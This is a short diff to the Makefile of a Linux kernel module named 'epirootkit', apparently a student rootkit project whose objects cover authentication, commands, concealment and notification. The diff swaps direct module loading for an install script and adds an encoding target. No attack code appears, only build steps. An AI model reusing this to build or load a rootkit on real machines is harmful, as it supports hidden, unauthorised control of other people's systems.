@@ -1,3 +1,4 @@
+
 obj-m += epirootkit.o
 epirootkit-objs := main.o auth.o cache.o commandes.o dissimulation.o notification.o
 
@@ -11,7 +12,10 @@ clean:
 	rm -rf .tmp_versions
 
 install:
-	sudo insmod epirootkit.ko
+	sudo bash install.sh
+
+encodage:
+	sudo bash encodage.sh init
 
 remove:
 	sudo rmmod epirootkit
